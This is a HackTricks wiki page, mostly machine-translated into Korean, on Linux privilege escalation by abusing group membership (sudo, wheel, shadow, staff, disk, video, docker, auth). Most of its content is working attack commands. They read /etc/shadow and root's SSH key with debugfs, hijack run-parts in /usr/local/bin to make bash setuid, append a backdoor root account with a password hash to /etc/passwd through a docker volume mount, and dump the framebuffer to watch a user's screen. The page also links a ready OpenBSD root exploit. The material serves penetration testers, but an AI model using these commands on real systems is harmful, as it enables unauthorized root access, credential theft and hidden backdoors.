# Interesting Groups - Linux Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Sudo/Admin Groups

### **PE - Method 1**

**때때로**, **기본적으로 (또는 일부 소프트웨어가 필요하기 때문에)** **/etc/sudoers** 파일 안에서 다음과 같은 줄을 찾을 수 있습니다:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
이것은 **sudo 또는 admin 그룹에 속한 모든 사용자가 sudo로 무엇이든 실행할 수 있다는 것을 의미합니다**.

이 경우, **root가 되려면 다음을 실행하면 됩니다**:
```
sudo su
```
### PE - Method 2

모든 suid 바이너리를 찾고 **Pkexec** 바이너리가 있는지 확인하십시오:
```bash
find / -perm -4000 2>/dev/null
```
만약 **pkexec가 SUID 바이너리**이고 당신이 **sudo** 또는 **admin** 그룹에 속한다면, 아마도 `pkexec`를 사용하여 sudo로 바이너리를 실행할 수 있을 것입니다.\
이는 일반적으로 이러한 그룹이 **polkit 정책** 내에 있기 때문입니다. 이 정책은 기본적으로 어떤 그룹이 `pkexec`를 사용할 수 있는지를 식별합니다. 다음을 사용하여 확인하세요:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
여기에서 어떤 그룹이 **pkexec**를 실행할 수 있는지 확인할 수 있으며, **기본적으로** 일부 리눅스 배포판에서는 **sudo**와 **admin** 그룹이 나타납니다.

**루트가 되려면 다음을 실행할 수 있습니다**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
만약 **pkexec**를 실행하려고 시도했는데 이 **error**가 발생한다면:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**권한이 없어서가 아니라 GUI 없이 연결되어 있지 않기 때문입니다**. 이 문제에 대한 해결 방법은 여기에서 확인할 수 있습니다: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2개의 서로 다른 ssh 세션**이 필요합니다:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wheel Group

**때때로**, **기본적으로** **/etc/sudoers** 파일 안에서 이 줄을 찾을 수 있습니다:
```
%wheel	ALL=(ALL:ALL) ALL
```
이것은 **wheel 그룹에 속한 모든 사용자가 sudo로 무엇이든 실행할 수 있음을 의미합니다**.

이 경우, **root가 되려면 다음을 실행하면 됩니다**:
```
sudo su
```
## Shadow Group

**shadow** 그룹의 사용자들은 **/etc/shadow** 파일을 **읽을** 수 있습니다:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, read the file and try to **crack some hashes**.

## Staff Group

**staff**: 사용자가 루트 권한 없이 시스템에 로컬 수정을 추가할 수 있도록 허용합니다 (`/usr/local`). (`/usr/local/bin`의 실행 파일은 모든 사용자의 PATH 변수에 포함되어 있으며, 동일한 이름의 `/bin` 및 `/usr/bin`의 실행 파일을 "덮어쓸" 수 있습니다). 모니터링/보안과 더 관련된 "adm" 그룹과 비교하십시오. [\[source\]](https://wiki.debian.org/SystemGroups)

debian 배포판에서 `$PATH` 변수는 `/usr/local/`가 특권 사용자 여부에 관계없이 가장 높은 우선 순위로 실행됨을 보여줍니다.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
`/usr/local`에 있는 일부 프로그램을 탈취할 수 있다면, 우리는 쉽게 root 권한을 얻을 수 있습니다.

`run-parts` 프로그램을 탈취하는 것은 root 권한을 얻는 쉬운 방법입니다. 왜냐하면 대부분의 프로그램이 (crontab, ssh 로그인 시) `run-parts`를 실행하기 때문입니다.
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
또는 새로운 ssh 세션 로그인 시.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**익스플로잇**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

이 권한은 **루트 접근과 거의 동등**하며, 머신 내부의 모든 데이터에 접근할 수 있습니다.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:  
디버그 파일 시스템(debugfs)을 사용하면 **파일을 쓸 수** 있다는 점에 유의하세요. 예를 들어 `/tmp/asd1.txt`를 `/tmp/asd2.txt`로 복사하려면 다음과 같이 할 수 있습니다:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
그러나 **root가 소유한 파일**(예: `/etc/shadow` 또는 `/etc/passwd`)에 **쓰기**를 시도하면 "**Permission denied**" 오류가 발생합니다.

## Video Group

`w` 명령어를 사용하면 **시스템에 로그인한 사람**을 찾을 수 있으며, 다음과 같은 출력을 보여줍니다:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
The **tty1**는 사용자 **yossi가 물리적으로** 머신의 터미널에 로그인했음을 의미합니다.

**video group**은 화면 출력을 볼 수 있는 권한이 있습니다. 기본적으로 화면을 관찰할 수 있습니다. 이를 위해서는 **현재 화면의 이미지를** 원시 데이터로 가져오고 화면이 사용하는 해상도를 알아야 합니다. 화면 데이터는 `/dev/fb0`에 저장할 수 있으며, 이 화면의 해상도는 `/sys/class/graphics/fb0/virtual_size`에서 찾을 수 있습니다.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
To **open** the **raw image** you can use **GIMP**, select the **`screen.raw`** file and select as file type **Raw image data**:

![](<../../../.gitbook/assets/image (463).png>)

Then modify the Width and Height to the ones used on the screen and check different Image Types (and select the one that shows better the screen):

![](<../../../.gitbook/assets/image (317).png>)

## Root Group

기본적으로 **root 그룹의 구성원**은 **서비스** 구성 파일이나 **라이브러리** 파일 또는 **권한 상승**에 사용될 수 있는 **기타 흥미로운 것들**을 **수정**할 수 있는 접근 권한을 가질 수 있는 것 같습니다...

**root 구성원이 수정할 수 있는 파일 확인**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

호스트 머신의 **루트 파일 시스템을 인스턴스의 볼륨에 마운트**할 수 있으므로, 인스턴스가 시작될 때 즉시 해당 볼륨에 `chroot`를 로드합니다. 이는 사실상 머신에서 루트 권한을 부여합니다.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
마지막으로, 이전의 제안 중 마음에 들지 않거나 어떤 이유로 작동하지 않는 경우(도커 API 방화벽?) **특권이 있는 컨테이너를 실행하고 그로부터 탈출하는** 방법을 시도할 수 있습니다. 여기에서 설명합니다:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

도커 소켓에 대한 쓰기 권한이 있는 경우 [**도커 소켓을 악용하여 권한을 상승시키는 방법에 대한 이 게시물을 읽어보세요**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## lxc/lxd 그룹

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm 그룹

일반적으로 **`adm`** 그룹의 **구성원**은 _/var/log/_에 위치한 **로그** 파일을 **읽을** 수 있는 권한이 있습니다.\
따라서 이 그룹 내의 사용자를 손상시킨 경우 **로그를 확인해야** 합니다.

## Auth 그룹

OpenBSD 내에서 **auth** 그룹은 사용되는 경우 _**/etc/skey**_ 및 _**/var/db/yubikey**_ 폴더에 쓸 수 있습니다.\
이 권한은 다음의 익스플로잇을 사용하여 **루트로 권한을 상승시키는** 데 악용될 수 있습니다: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**

</details>
{% endhint %}
